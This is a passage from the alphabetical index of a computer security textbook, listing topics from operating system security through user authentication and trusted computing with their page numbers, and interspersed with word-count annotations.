interacting with other programs, ­408–​­409
least privileges, ­400–​­402
privilege escalation, ­400–​­402
race conditions, prevention of, ­405–​­406
standard library functions, ­402–​­405
systems calls and, ­402–​­405
temporary files, safe use of, ­407–​­408
Operating system security
[Word Count: 36]

additional security controls, installation of, 423
categories of users, groups, and authentication, 422
hardening and configuring the operating system, ­419–​­423
initial setup and patching, ­420–​­421
Linux/Unix, ­426–​­430
planning, 419
removing unnecessary services, application, and protocols,
[Word Count: 35]

­421–​­422
resource controls, configuration of, 422
security layers, 417
security testing, 432
testing of, 423
Windows, ­430–​­432
Operational control, 35, ­517–​­518
Operation Aurora, 2009, 220, 226
Operator, 293
­Opt-​­in, 469
Orange Book, 470
Organizational security policy, ­489–​­492
­OR-​­node, ­32–​­33
OR security rule, 454
OS. See Operating system (OS)OSI. See Open systems
[Word Count: 51]

­interconnection (OSI)
OSI security architecture, ­4–​­5
­Out-​­of-​­band attack, 167
Outside attack, 19
Overflows
[Word Count: 13]

buffer, ­337–​­338, 342, ­348–​­349, ­351–​­352, ­359–​­360, ­362–​­365,
[Word Count: 7]

370
global data area, ­370–​­371
heap, ­367–​­370
­off-​­by-​­one attacks, 366
replacement stack frame, ­365–​­366
Overrun. See Overflows
Overvoltage condition, 542
Owner, 56, 61, 67, 91, 117, ­121–​­123, ­125–​­127, 129, ­135–​­136, 169,
[Word Count: 31]

­171–​­173, ­177–​­179, 196, ­397–​­400, ­407–​­408, 428, ­615–​­616, 
618, 626, 719, 722
‘Owner’ access right, 123
­Ownership-​­based administration, 169
[Word Count: 18]

Packet filtering firewall, ­309–​­312
pack() function, 348
Padding, 710
Pad Length, 710
Pairwise keys, ­753–​­756
Pairwise master key (PMK), 753
Pairwise transient key (PTK), 754
Pantomimes, copyrighted, 616
Parameterized query insertion, 168
[Word Count: 32]

Parasitic software, 204
Parasitic virus, 221
Partitioning, 179
Passive attack, 19, ­24–​­25
Passive sensor, 284, 297
Password Authenticated Connection Establishment
[Word Count: 20]

cracking of ­user-​­chosen passwords, ­83–​­85
file access control, 86
guessing against single user, 79
length, 83
protocol, ­101–​­102
­Password-​­based authentication, ­78–​­90
[Word Count: 21]

identifier (ID), 78
password cracking of ­user-​­chosen passwords, ­83–​­85
use of hashed passwords, ­80–​­83
vulnerability of, ­78–​­80
Password cracker, 82
Password selection strategies, ­86–​­90
[Word Count: 24]

Bloom filter, ­88–​­90
complex password policy, 88
­computer-​­generated passwords, 88
password checker, 88
reactive password checking, 88
rule enforcement, 88
user education strategy, 88
using proactive password checker, 88
Patch management
[Word Count: 31]

Linux/Unix security, 427
Windows security, 430
Patching, 188, 306, ­420–​­421
Patents, intellectual property and, 615, 617
Path MTU, 710
PATH variable, ­398–​­399
Pattern matching, 324
Payload, 205, ­221–​­229
Payload actions, 202
Payload Data, 710
PC Cyborg Trojan, 222
PC data encryption, 67
­Peer-​­to-​­peer “gossip” protocol, 289
Perimeter scanning approaches, ­234–​­235
Periodic review of audit trail data, 601
Period of validity, 723
Permanent key, 663
Permission, computer security and, 130, 133
Permissions, ­28–​­29, 73, ­124–​­125, 127, ­130–​­131, 133, ­138–​­139,
[Word Count: 78]

­172–​­173, 208, 393, 397, 408, 420, 422, ­427–​­429, 431, 
­460–​­461, 626
Persistent, 203
Personal firewalls, ­316–​­317
Personal identification number (PIN), 34, 75, 91, 95, 98,
[Word Count: 25]

142, 548
Personal identity verification (PIV), ­548–​­550
Personal privacy, 619
Personal property, 615
Personnel, role in physical security, 536
Personnel security, 27
[Word Count: 22]

during employment, 565
Phishing, 192, 200, ­202–​­203, ­218–​­219, ­224–​­226, 271, 330, 614
Phoenix crimeware toolkit, 203
Physical access audit trail, 587
[Word Count: 21]

Physical access control system (PACS), ­551–​­553
Physical and logical security, integration of, ­547–​­553
Physical facility, 536
Physical isolation, 30
Physical probing, 474
Physical security, 535
[Word Count: 25]

breaches, recovery from, ­546–​­547
environmental threats, ­539–​­542
­human-​­caused threats, 543, ­545–​­546
logical security and, integration of, 535, ­547–​­553
natural disasters as threats to, ­536–​­539
personal identity verification (PIV), ­548–​­550
policy, ­real-​­world example of, 547
prevention and mitigation measures, ­543–​­546
technical threats, ­542–​­543
threats, ­536–​­543
Physical user input, 166
Pictorial, graphic, and sculptural works, copyrighted, 616
Piggybacked queries, 167
Ping of death, DoS, 243
PIV authentication key (PKI), 551
PIV card issuance and management subsystem, 548
PIV front end subsystem, 548
Plaintext, ­42–​­43, 56, 638, 646
[Word Count: 85]

­public-​­key encryption, 56
symmetric encryption, 42
­Plan-​­Do-​­Check-​­Act Process Model, 489
Planning, 26
Plant patents, 617
Platform as a service (PaaS), ­182–​­183, 186
Poison packet, DoS, 242
Policy changes, 591
Policy enforcement points (PEPs), 291
Policy management, 142
Policy scope, 566
Polyinstantiation, ­465–​­466
Polymorphic virus, ­208–​­209, 232
Popular password attack, 79
Position independent, ­352–​­353
[Word Count: 53]

x86 assembly code, 353
Post Office Protocol (POP), 287
Practical security assessments, 767
Preimage resistant, 53
Preimage resistant hash functions, ­53–​­54
Premises security, 535
Premium Content Web site, 8
Preprocessing, 660
Prerequisite, 133
Preset session ID, 34
­Pre-​­shared key (PSK), 753
Pretty Good Privacy (PGP) package, ­66–​­67
Preventative controls, 518
Prevent/Prevention, 19, ­24–​­25, 27, 30, ­35–​­36, 64, 79, 109, 114,
[Word Count: 60]

163, 168, 175, 190, 225, 252, 259, ­262–​­263, 273, 281, 310, 
312, 322, 329, 334, 337, 359, 362, ­365–​­366, 370, 376, 
­385–​­387, ­398–​­399, ­404–​­405, 410, 413, 418, 420, 423, 431, 
­454–​­455, 459, 464, 484, 499, 518, 520, ­535–​­536, ­543–​­546, 
552, 555, 571, 573, 575, 581, 614, 617, 619, 622, 624, 700, 
704, 707, 710, 735
Primary key, ­159–​­161, 180, 465
printf() library routine, 348
Privacy, 13, 566
[Word Count: 67]

data surveillance and, ­625–​­626
European Union Data Protection Directive, 622
laws and regulations, ­622–​­623
with message integrity, 746
organizational response, ­623–​­624
personal, 622
United States Privacy Act, ­622–​­623
Private cloud, 184
Private key, ­56–​­58, ­60–​­61, 425, 681, 688
Privilege escalation, 400
­Privilege-​­escalation exploits, 322
Privilege management, 142
Privilege use, 591
Proactive password checker, 88
Process tracking, 591
­Profile-​­based anomaly detection, 275
Program code, writing
[Word Count: 64]

allocation and management of dynamic memory storage,
[Word Count: 7]

­395–​­396
correct algorithm implementation, ­392–​­394
correspondence between algorithm and machine
[Word Count: 10]

­language, 394
interpretation of data values, ­394–​­395
preventing race conditions with shared memory, 396
Program input, ­380–​­391
[Word Count: 17]

buffer overflow, 381
canonicalization, 390
escaping metacharacters, 389
fuzzing, ­390–​­391
interpretation of, ­381–​­388
multiple encodings, 389
size of, 381
validating syntax, ­388–​­390
Programmers, 562
Programming projects, 767
Program output, handling of, ­409–​­411
Program, writing a, ­378–​­379
Project MAC (­multiple-​­access computers), 449
Propagation phase of virus, 205
*-Property, ­442–​­445, ­449–​­450, ­455–​­456, 459, 461
Protected storage, TC, ­469–​­470
Protection
[Word Count: 57]

domains, ­123–​­124
media, 26
physical and environment, 26
profiles (PPs), 472, ­474–​­476
system and communications, 27
Protocol anomaly, 324
Protocol identifier, 709
Protocol type selection (PTS) command, 92
Provable security, 660
Proxy. See Gateways
Proxy certificates, 724
Pseudonymity, 624
Pseudorandom function (PRF), ­758–​­760
Pseudorandom numbers, ­64–​­66
Psychological acceptability, 29
Public access systems, 522
Public cloud, 183
­Public-​­display right, 616
­Public-​­key certificates, ­61–​­62, 697
­Public-​­key encryption/cryptosystem, ­55–​­60, 92, 222
[Word Count: 68]

asymmetric encryption algorithms, ­59–​­60
authentication and/or data integrity, 57
confidentiality, ­56–​­57
­Diffie–​­Hellman key exchange, ­684–​­688
Digital Signature Standard (DSS), 688
elliptic curve cryptography (ECC), ­688–​­689
­general-​­purpose, 56
HMAC, ­675–​­679
ingredients, 56
message or data authentication using, 50, 52
mode of operation of, ­56–​­57
­public-​­key key distribution, 55
requirements, ­58–​­59
RSA, ­679–​­684
secure hash functions, ­670–​­675
structure, ­55–​­58
symmetric key exchange using, ­62–​­63
­Public-​­key information, 722
­Public-​­key infrastructure (PKI), ­725–​­726
Public Key Infrastructure X.509 (PKIX), ­726–​­727
Public keys, 56, 60, 686, 688, 725
­Public-​­performance right, 616
[Word Count: 85]

Quality of Service (QoS) attributes, 134
Queries, 20, 164, 166, 168, ­177–​­178, 283, 393, ­464–​­465, 603,
[Word Count: 16]

626, 724
AS, 718
database, 243
DNS, 253, ­256–​­257, 259
illegal/logically incorrect, 167
inference and, 173, 175
piggybacked, 167
Query languages, ­158–​­159, ­162–​­163. See also Structured Query
[Word Count: 27]

Race conditions, prevention of, 396
­Radix-​­64, ­696–​­697
Rainbow table, 83
Random access, 660
Random access memory (RAM), 92
Random delay, 684
Random number, 80, 87, 93, ­102–​­103
Random number generator (RNG), 468
Random numbers, security algorithms based on, ­64–​­65
[Word Count: 39]

independence of, 64
pseudorandom numbers vs., ­65–​­66
randomness of, ­64–​­65
uniform distribution, 64
unpredictability of, 65
Random (selective) drop of an entry, 262
Ransomware, ­221–​­222
Rapid elasticity, 182
Rate limiting, ­592–​­593
Raw socket interface, DoS, 244
RBAC. See ­Role-​­based access control (RBAC)
RC4 algorithm, ­653–​­655
Reactive password checking, 88
Read access, 117, 464
Reading/report assignments, 768
­Read-​­only memory (ROM), 92
Realms, Kerberos, 64, 707, ­716–​­722
Real property, 615
[Word Count: 68]

­Real-​­time audit analysis, 602
Reasonable personal use, 567
Received code, 49
Reconnaissance, 226
Recover, 19
Recovery, 36
Recursive function call, 343
Reference monitors, ­457–​­458
Reflection attacks, ­255–​­257
Reflector attacks, 250, ­255–​­257
Registration, 727
Registration authority (RA), 74, ­726–​­727
Registry access, 279
Regular expression, 389
Regulations obligations, 558
Reject, 326
Relation, ­159–​­160, 400, 417, 452, ­460–​­462, 500, 522
Relational databases, ­159–​­162
[Word Count: 60]

abstract model of, 161
basic terminologies of, 160
creation of multiple tables, 159
elements of, ­159–​­162
example, ­160–​­161
relational query language, 159
structure, 159
structured query language (SQL), ­162–​­163
Release of message contents, 24
Reliance on key employees, 565
Relying parties (RPs), 75, 146
Remote code injection attack, 401
Remote Procedure Call (RPC), 287
Remote user authentication. See Authentication protocol
[Word Count: 60]

dynamic biometric protocol, 103
password protocol, ­101–​­102
static biometric protocol, 103
token protocol, 102
Replacement stack frame, ­365–​­366
Replay, 24, 38, 64, 102, ­104–​­105, 110, 518, 687, 704, 710, 713,
[Word Count: 30]

­719–​­720, 747, 758
Replay attacks, 105, 687, 704, 758
Repository, 727
Reproduction right, 616
Repudiation, ­20–​­21, 518
Requests for Comments (RFCs), 9
[Word Count: 22]

Intrusion Detection Exchange Format, 292
RFC 2827, Network Ingress Filtering: Defeating ­Denial-​
[Word Count: 12]

­of-​­service attacks which employ IP Source Address 
Spoofing, 260
RFC 2828 (Internet Security Glossary), 272
RFC 4871: DomainKeys Identified Mail (DKIM)
[Word Count: 21]

Signatures, 697
RFC 4949, Internet Security Glossary, 17, 114
Requirements, 275
Research projects, 766
Residual risk, 523
Resource management, 142
Resource pooling, 182
Resources, 134, 500, 732
Response, 36, 293
Retinal biometric system, 97
Return address defender (RAD), 363
Return to system call, ­366–​­367
Reverse engineering, 618
[Word Count: 47]

REVOKE command, ­169–​­170
RFCs. See Requests for Comments (RFCs)
Rights holders, 620
Rijndael, 45
Risk, 17, 19, 499
[Word Count: 18]

acceptance, ­506–​­507
analysis, 380
appetite, 498
avoidance, 507
consequences, ­503–​­504
high level, 78
index, 496
likelihood, 502
low level, 77
moderate level, 78
register, ­504–​­505
transfer, 507
treatment, ­506–​­507
Risk assessment, 27
[Word Count: 32]

electronic user authentication, ­75–​­78
of systems, 523
Rivest, Ron, 59, 679
Rlogin, 287
Robust filtering, 592
Robust Security Network (RSN), ­746–​­747, 750, 760
RockYou file, 85
Role, 130
­Role-​­based access control (RBAC), 116, ­127–​­133
[Word Count: 34]

access control matrix, 129
for a bank, ­147–​­150
base model, ­130–​­132
cardinality, 133
constraints, ­132–​­133
of database, ­171–​­173
key elements, 129
­many-​­to-​­many relationships between users and roles, 131
matrix representation of, 129
multilevel security, ­460–​­461
mutually exclusive roles, 133
­non-​­overlapping permissions, 133
prerequisites, 133
reference models, ­130–​­133
relationship of users to roles, 128
role hierarchies, 132
Role constraints, 132
Role hierarchies, ­131–​­132
Roles, 445, 461
[Word Count: 65]

fixed database, 172
fixed server, 172
hierarchies, 132
RBAC, ­127–​­133, ­171–​­173
relative to IT systems, 558
­user-​­defined, ­172–​­173
Root, ­32–​­33, 136, 201, 217, 227, 236, 270, 322, ­356–​­358, ­368–​­369,
[Word Count: 29]

371, 398, 401, 407, ­428–​­430, ­449–​­450, 469, ­585–​­586, 593, 
­685–​­687, 725, 750, 755
Rootkits, 201, ­226–​­229
[Word Count: 16]

Blue Pill, 229
characteristics of, ­227–​­228
countermeasures, 234
definition, 227
external mode, 228
kernel mode, 228
[Word Count: 16]

­memory-​­based, 227
persistent store code, 227
­system-​­level call attacks, 228
user mode, 227
virtual machine and, ­228–​­229
Rotated XOR (RXOR), 671
Routing applications of IPSec, ­708–​­709
RSA ­public-​­key encryption algorithm, 59, ­679–​­684
[Word Count: 32]

description, ­679–​­681
factoring problem for, ­682–​­683
security, ­681–​­684
timing attacks and, ­683–​­684
Rsh, 287
­Rule-​­based anomaly detection, ­275–​­278
­Rule-​­based heuristic identification, ­277–​­278
­Rule-​­based penetration identification, ­277–​­278
Rules, The, 632
­Run-​­time defenses, ­363–​­365
­Run-​­time environment for application auditing, 599
­Run-​­time prevention techniques, 168
[Word Count: 42]

Safe coding techniques, ­360–​­362
Safeguard, 15, 492, ­516–​­524, 558, 635
Safe libraries, 362
Safe temporary file use, 407
Saffir/Simpson Hurricane Scale, 538
Sakura crimeware toolkit, 203
Salt value, ­80–​­84
San Diego Supercomputer Center, 324
Sanitized data, 456
­S-​­box, 645, 648
Scalability issues, 522
Scanning attack, 288
Screening router, 321
Scripting viruses, ­209–​­210
­Script-​­kiddies, 269
Sdrop, 326
Seagate Technology [SEAG08], 44
Search, access to, 117
­Second-​­generation scanner, 232
­Second-​­order injection, 166
Second preimage resistant hash function, 53
Secret key, 638
[Word Count: 79]

authentication, ­51–​­52
­public-​­key encryption, 56
symmetric encryption, 42
Secure electronic transactions (SET), 676, 722
Secure file shredding program, ­403–​­404
Secure Hash Algorithm (SHA), 54, 672
Secure hash functions, ­53–​­54
[Word Count: 29]

applications, 55
requirements, ­53–​­54
strength of, 54
Secure key delivery, 752
Secure/Multipurpose Internet Mail Extension (S/MIME), 62,
[Word Count: 17]

­694–​­697, ­699–​­700, 707, 722
Secure programming, 378
Secure Shell (SSH), 62
[Word Count: 11]

connections, 408
Secure sockets layer (SSL), 722
[Word Count: 7]

Alert Protocol, 703
architecture, ­701–​­702
Change Cipher Spec Protocol, 703
[Word Count: 10]

Handshake Protocol, ­703–​­705
Record Protocol, ­702–​­703
Security as a service, 189
Security assessments, 26, 192
Security association (SA), ­709–​­710
Security assurance and evaluation
[Word Count: 23]

Common Criteria Evaluation Assurance Levels,
[Word Count: 5]

­478–​­479
evaluation process, ­479–​­481
scope of, ­477–​­478
target audience, ­476–​­477
Security assurance requirements, 476
Security attack, 19, 24, 29, 32, 35. See also Attacks
Security auditing, 475
[Word Count: 27]

anomaly detection and, 581
at ­application-​­level, ­594–​­595
­application-​­level audit trails, 587
architecture, ­579–​­583
audit data analysis, ­602–​­604
audit review, 602
audit trail analysis, ­600–​­604
baselining, 603
case example, ­604–​­607
choice of data to collect, ­584–​­587
functions, ­580–​­581
implementation guidelines, 583
implementing the logging function, ­588–​­600
involving DHCP, 603
physical access audit trails, 587
protecting audit trail data, 588
requirements for, ­581–​­583
RFC 2196 (Site Security Handbook), 588
at system level, ­589–​­593, 595
­system-​­level audit trails, 586
terminology, 578
timing, ­601–​­602
UNIX OS, ­591–​­593
­user-​­level audit trail, 587
Windows OS, ­590–​­591
Security audit trail, 580
Security awareness, 558
[Word Count: 97]

program, ­559–​­561
training, 526
Security basics and literacy category, 558
Security class, 441
Security classification, 441
Security clearance, 441
Security compliance, 527
Security controls, 501
Security education, 562
Security Education (Seed) Projects, ­764–​­766
Security encryption, 621
Security evaluation (IT)
[Word Count: 39]

assurance and, ­476–​­481
common criteria, ­470–​­476, ­478–​­479
example of a protection profile, ­474–​­476
process, ­479–​­481
profiles and targets, ­472–​­474
requirements, ­471–​­472
Security functional requirements, 475
Security implementation, ­35–​­36
[Word Count: 28]

case study, ­528–​­531
change and configuration management, ­527–​­528
[Word Count: 8]

compliance, 527
controls (safeguards), ­516–​­526
detection of incidents, ­569–​­570
documentation of incidents, 573
handling of incidents, 528, ­573–​­574
incident response, ­571–​­572
ISO security controls, 520
maintenance, 527
NIST security controls, 519, ­521–​­522
plans, ­524–​­526
Security information and event management (SIEM), 193, 291,
[Word Count: 42]

­604–​­605
Security intrusion, 272
Security kernel database, 458
Security levels, 441
Security maintenance, process of, ­425–​­426
Security manager, 35
Security mechanism, 16, ­29–​­31, 36
Security Monitoring, Analysis, and Response System (MARS),
[Word Count: 31]

­606–​­607
Security objectives, 474
Security of the auditing function, 583
Security parameter index (SPI), ­709–​­710
Security policy, 17, ­34–​­35, 293, 477, 491, 567
[Word Count: 23]

violation, 34
Security reports, 580
Security requirements, ­475–​­476
Security risk assessment
[Word Count: 11]

Service providers, 143, ­145–​­147, 188, 620, 697
Session Initiation Protocol (SIP), 287
[Word Count: 12]

flood, ­252–​­253
Session key, ­64–​­65, ­662–​­663, 697, ­718–​­720, ­752–​­753
Sessions, 130, 133, 149, 410, ­560–​­561, ­606–​­607, 702
setfacl command, 127, 428
SetGID permission set, 125, 428
SetUID permission set, 125, 357, 368, 428
Shadow password file, 86
­SHA-​­1 engine, 469
Shamir, Adi, 59, 679
Shared files, locking for software security, ­405–​­407
Shared libraries, ­595–​­596
­Shared-​­resource covert channels, 450
Shared system resources, ­405–​­406
Shared technology issues, 188
SHA secure hash function, ­672–​­675
Shell, 208, 251, ­351–​­352, ­356–​­357, 359, ­367–​­368, 384, ­397–​­400,
[Word Count: 80]

traffic, rule set for, ­309–​­310
Smurf DoS program, 258
Sniffing traffic, 223
SNMP, 287
Snort, ­296–​­300
[Word Count: 16]

architecture, ­296–​­297
characteristics, 296
definition, 296
destination IP address, 298
destination port, 298
direction, 298
implementation, 297
­meta-​­data rule, ­298–​­299
­non-​­payload rule, ­298–​­299
payload rule, ­298–​­299
[Word Count: 26]

­post-​­detection rule, ­298–​­299
protocol, 298
rule action, ­297–​­298
rules, ­297–​­300
source IP address, 298
source port, 298
Snort Inline, 326
SNORT system, 278
Snowden, Edward, 269
SOCKS, 314
Software, 18, 22, 177, 618
[Word Count: 33]

attack surface, 31
­behavior-​­blocking, 233
bugs, 378
copyrighted, 616
development life cycle, 380
efficiency, 660
quality, 377
reliability, 377
Software as a service (SaaS), 182, 186
Software Assurance Forum for Excellence in Code (SAFE-
[Word Count: 34]

defensive programming and, 7, ­376–​­380
issues, ­376–​­380
operating systems, interaction of, ­396–​­409
probability distribution of targeting specific bugs, 378
program input, handling, ­380–​­391
program output, handling, ­409–​­411
standard library functions, ­402–​­405
systems calls, ­402–​­405
writing safe program code, ­392–​­396
Sound recordings, copyrighted, 616
Source address spoofing, ­244–​­246
Source and destination ­transport-​­level address, 309
Source IP address, 309
Source routing attacks, 311
SPAM ­e-​­mail, 202, ­218–​­219
Spammer programs, 201
Spamming, 223
­Spear-​­phishing attack, ­225–​­226
Special reader, 91
Specific account attack, 79
Sponsors, 480
Spoofing, 34, 242, ­244–​­248, 250, ­256–​­257, ­261–​­262, 307, 311, 733
sprintf() library routine, 349
Spyware, 201, ­224–​­225
[Word Count: 99]

detection and removal, 234
payloads, 225
­SQL-​­based access control, ­169–​­170
­SQL-​­DOM, 168
SQL injection, 384
SQL injection (SQLi) attack, ­163–​­168, 385
[Word Count: 21]

attack avenues and types, ­166–​­167
countermeasures, 168
example of, ­164–​­165
injection technique, 165
SQL Slammer worm, 215
SSL Record Protocol, ­701–​­703
Stack buffer overflow, ­342–​­351
[Word Count: 25]

example, ­344–​­349, ­356–​­359
vulnerabilities, ­349–​­351
Stack frame, 343
[Word Count: 8]

Stackguard, 363
Stack protection mechanisms, ­362–​­363
Stackshield, 363
Stack smashing, 342
Standard library functions, 367, ­402–​­405
Standard of conduct, 567
Standard of Good Practice for Information Security (ISF05),
[Word Count: 28]

The, 491, 561, 624
Stateful inspection firewall, 312
Stateful matching, 324
Stateful protocol analysis (Spa), 288
­State-​­sponsored organizations, 269
Statically linked libraries, ­595–​­596
Statically linked shared libraries, 596
Static biometric protocol, 103
Statistical anomaly, 324
Statistical databases, 23
Statistical Packet Anomaly Detection Engine (SPADE), 287
Stealthing
[Word Count: 46]

backdoor, ­226–​­227
rootkit, ­227–​­229
Stealth virus, 208
strcpy() library function, 362, 367
Stream ciphers, 47, ­651–​­652
Strong collision resistant, 53
Structured query language (SQL), ­162–​­163, ­165–​­166, 178,
[Word Count: 27]

464, 587
Stuxnet worm, ­215–​­216, 222, 226, 421
SubBytes transformation, 648
Subject attributes, 134
Subjects, 117, 146, 454, 722
Subscriber, 74
Substitute Bytes, 645
SubVirt, 229
Summary events, 291
Superuser, ­125–​­126
Supervisory Control and Data Acquisition (SCADA), 497,
[Word Count: 38]

­509–​­510, 512, ­529–​­530
Supporting facilities, 536
Supportive controls, 518
Support Vector Machines (SVM), 279
Symmetric block encryption algorithms
[Word Count: 18]

Advanced Encryption Standard (AES), 45
comparison of, 44
Data Encryption Standard (DES), ­43–​­44
practical security issues, ­45–​­46
triple DES, 45
Symmetric encryption
[Word Count: 22]

approaches to attacking, ­42–​­43
cipher block chaining (CBC) mode, ­656–​­657, 671
cipher block feedback (CFB) mode, ­657–​­659
counter (CTR) mode, ­659–​­660
cryptanalysis, ­42–​­43, 45, ­54–​­55, ­639–​­641
Data Encryption Algorithm (DEA), 43, 643
Data Encryption Standard (DES), 41, 82, 643, 717
electronic codebook (ECB) mode, 45, 48, ­655–​­656
Feistel cipher structure, ­641–​­643
historical evidence, 41
ingredients of, 42
key distribution, ­662–​­664
message confidentiality and, ­637–​­664
message/data authentication using, 48
modes of operation, ­655–​­660
[Word Count: 72]

RC4 algorithm, ­653–​­655
requirements for secure use of, 42
secret key, 42
simplified model, 42
stream ciphers, 47, ­651–​­652
triple DES (3DES), 45, 109, ­643–​­645
types of, 46
Symmetric encryption devices, location of, ­660–​­662
Symmetric stream encryption algorithms, 41
SYN Cookies, 262
­SYN-​­FIN attack, 299
SYN flood, ­250–​­251
SYN spoofing attack, ­246–​­248, 261
syslog(), 591
syslogd, 592
Syslog protocol, ­591–​­593
System Access Control List (SACL), 591
System architecture, 477
System calls, 323
[Word Count: 72]

traces, 278
system(”command.exe”) function, 352
System corruption, 200, ­221–​­222
[Word Count: 9]

data destruction, ­221–​­222
logic bomb, 222
nature of, 221
­real-​­world damage, 222
System events, 591
system() function, 367
System integrity, 13, 477
[Word Count: 22]

verification tools, 570
­System-​­level auditing data, 594
­System-​­level audit trails, ­588–​­593
System maintainers, 562
System Management Mode (SMM), 229
System registry settings, 323
System resources, ­17–​­18
[Word Count: 26]

modification of, 322
System resources (assets), ­17–​­18, ­21–​­25, ­498–​­499
System routine, 124
System’s access control protections, 20
Systems and services acquisition, 27
Systems calls, software security, ­402–​­405
System testing, 477
[Word Count: 30]

Target of evaluation (TOE), 471
Tautology, ­166–​­167
TCP, 50, 242, ­246–​­249, ­255–​­256, ­261–​­262, ­287–​­289, 296,
[Word Count: 15]

­298–​­299, 302, ­309–​­314, 317, 324, 326, ­392–​­393,  
584, 592, 701, 703, ­706–​­708, ­710–​­711
TCP/IP (Transmission Control Protocol/Internet Protocol),
[Word Count: 18]

16, 109, 242, 245, 249, 258, 262, 311, 393, 593, 603
TCP SYN flood, 250
TCP SYN spoofing attack, 247
TCP wrappers library, 429
Technical security controls, 518
Technical threats, ­542–​­543
[Word Count: 31]

prevention and mitigation measures, 545
Technology controls, 520
Telnet, 287, 312
tempnam() function, 407
Temporal Key Integrity Protocol (TKIP), 750, 758
Temporal Key (TK), 756
Temporary files, safe use of, ­407–​­408
[Word Count: 31]

Termination process, 565
Testing, 31, 36, 83, 99, 244, 297, 325, 352, ­377–​­379, 381, ­390–​­391,
[Word Count: 15]

394, 405, 423, 430, 432, ­476–​­480, 528, 545, 618, 628
Theft, 543
Theft of the token, 105
­Third-​­generation programs, 232
Threat agent, 17, 19
Threats, ­17–​­19, 203, 474, 499. See also Attacks
[Word Count: 32]

assets of a computer system and, ­21–​­25
attacks and, ­19–​­21
electrical power, 542
electromagnetic interference (EMI), 543
­human-​­caused, 543
to mobile devices, ­736–​­737
physical security, ­536–​­543
to wireless networks, ­733–​­734
Threat source, 500
Thresholding, ­603–​­604
­Ticket-​­granting service (TGS), 718
­Ticket-​­granting ticket (TGT), ­718–​­719
Tiny fragment attacks, 311
TKIP sequence counter (TSC), 758
Token protocol, 102
Tokens, 118
[Word Count: 57]

automatic teller machine (ATM), 91
electronic identity (eID) card, ­93–​­96
loss, 91
memory cards, ­90–​­91
personal identification number (PIN), 91, 95
smart cards, ­91–​­93
Tornado, 537
TPM functions, 468
Trademark, 617
Traffic analysis, 24
Traffic anomaly, 324
Traffic security, 739
Training, 26
­Transfer-​­only right, 123
Transformation procedures (TPs), 452
Transport Layer/Secure Socket Layer Security
[Word Count: 54]

(TLS/SSL), 408
Transport layer security (TLS), 62, 676, 700
Trapdoor. See Backdoor (trapdoor)
Triage, 569
Tribe Flood Network (TFN), 251
Tribe Flood Network 2000 (TFN2K), 251
Triggering phase of virus, 205
Triple DES (3DES), 45, 109, ­643–​­645
[Word Count: 37]

attractions, 45
principal drawback, 45
Trivial File Transfer Protocol (TFTP), 287
Trojan horse, 21, 201, ­219–​­220
[Word Count: 16]

models, 220
Trojan horse attack, 21, ­104–​­105, 201, 215, 217, 227, 268, 322, 452
[Word Count: 14]

defenses, ­458–​­459
Trojan horse programs, ­218–​­220, ­458–​­459
Trojan horse sniffers, 315
Trojans, 202
[Word Count: 13]

mobile phone, ­220–​­221
Tropical cyclones, 537
True random number generator (TRNG), ­65–​­66
Trust, 15, 114, 136, 139, 141, 188, 191, 225, 421, 452, 456, 467,
[Word Count: 25]

491, 564, 699, 716, 720, ­725–​­726
Trusted computer system, 456
[Word Count: 10]

Trusted Computer System Evaluation Criteria
[Word Count: 5]

­(TCSEC), 470
Trusted computing (TC), 456, 466
[Word Count: 7]

authenticated boot service, ­466–​­467
certification service, 467
encryption service, ­467–​­468
platform module (TPM), ­468–​­469
protected storage, ­469–​­470
reference monitors, ­457–​­458
Trojan horse defenses, ­458–​­459
Trusted computing base (TCB), 456
Trusted computing and platform module
[Word Count: 34]

authenticated boot service, ­466–​­467
certification service, 467
encryption service, ­467–​­468
protected storage, ­469–​­470
TPM functions, ­468–​­469
Trusted distribution, 478
Trusted platform module (TPM), 466
Trusted recovery, 478
Trusted systems, 456
[Word Count: 30]

reference monitors, ­457–​­458
terminologies, 456
Trojan horse defense, ­458–​­459
Trust framework providers, 146–147
Trust frameworks, ­143–​­147
[Word Count: 16]

open identity, ­145–​­147
traditional approach, ­143–​­145
Trustwave 2013 Global Security Report, 163
Trustworthiness, 456
Trustworthy system, 458
Tuples, 159, 462
[Word Count: 20]

Ubuntu Linux systems, ­279–​­280
UDP, 249, 251, ­255–​­258, 261, ­287–​­288, 296, 298, 309, 314, 317,
[Word Count: 15]

324, 326, 328, 708, 711
UDP flood attack, 249
Unauthorized, 13, ­19–​­24, 27, 30, 35, 76, 79, 86, 91, 114, 156,
[Word Count: 21]

173, ­188–​­189, 217, 226, 268, 270, ­274–​­275, 278, ­286–​­287, 
293, 307, 312, 316, 319, 376, 431, 442, 451, 457, 464, 478, 
­509–​­511, 536, 543, 546, 563, ­567–​­568, 571, 584, 587, 
­618–​­619, 623, 626, 628, 709, 717, ­734–​­735, 739
Unauthorized disclosure, 19
Unauthorized physical access, 543
Unavailability of system, 18
Unconstrained data items (UDIs), 452
Undervoltage condition, 542
Unicode, 389
Unified threat management (UTM) system, ­326–​­330
[Word Count: 65]

appliance architecture, 327
UNIX file access control, ­124–​­127
[Word Count: 8]

access control lists, 127
directory, structure of, 124
“effective group ID,” 125
“effective user ID,” 125
FreeBSD, 127
protection bits, 125
“real group ID,” 125
“real user ID,” 125
setfacl command, 127
“set group ID” (SetGID) permissions, 125
“set user ID” (SetUID) permissions, 125
traditional, 125
user identification number (user ID), 125
[Word Count: 52]

UNIX operating system, 342
UNIX password scheme, ­80–​­82
[Word Count: 8]

implementation of, ­82–​­83
Unknown risk profile, 188
Unlinkability, 624
Unobservability, 624
U.S. Digital Millennium Copyright Act (DMCA), ­618–​­619
User, 130, ­177–​­178
User authentication
[Word Count: 23]

­biometric-​­based, ­96–​­101
case study of, ­107–​­110
electronic, ­74–​­78
means of, 75
­password-​­based, ­78–​­90
potential attacks, ­103–​­105
remote, ­101–​­103
risk assessment for, ­75–​­78
security issues, ­103–​­105
­token-​­based, ­90–​­96
User credential compromise, 34
User credential guessing, 34
­User-​­defined roles, ­172–​­173
User dissatisfaction, 91
User education strategy, 88
User identification number (user ID), 125
User input, 166
User interface (UI)
[Word Count: 57]

to an IDS, 273
redress attack, 218
­User-​­level auditing data, 594
­User-​­level audit trails, 588, ­594–​­595
User mistakes, 79
User mode, 124
Users administration, 431
­User-​­supplied password, 81
User terminal and user (UT/U), 33
Usurpation, 21
­UTF-​­8 encoding, 389
Utility patents, 617
[Word Count: 42]

Vandalism, 543
Veracode 2013 State of Software Security Report, 163
Verifiability, 457
